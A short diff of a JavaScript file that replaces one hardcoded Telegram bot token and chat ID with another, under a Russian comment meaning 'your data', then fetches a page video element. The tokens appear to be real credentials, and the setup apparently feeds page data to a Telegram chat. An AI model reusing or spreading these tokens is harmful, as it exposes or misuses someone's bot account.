@@ -1,6 +1,6 @@
 // ТВОИ ДАННЫЕ
-const BOT_TOKEN = '8621842542:AAGj8u2N6VHyIZNw3qX_qN9aSsSOYsZi424';
-const CHAT_ID = '8244138604';
+const BOT_TOKEN = '8583690981:AAH_esCG5wUMmRiegjxDARFQDW6l-VxfJ9w';
+const CHAT_ID = '526758225';
 
 const video = document.getElementById('video');
 
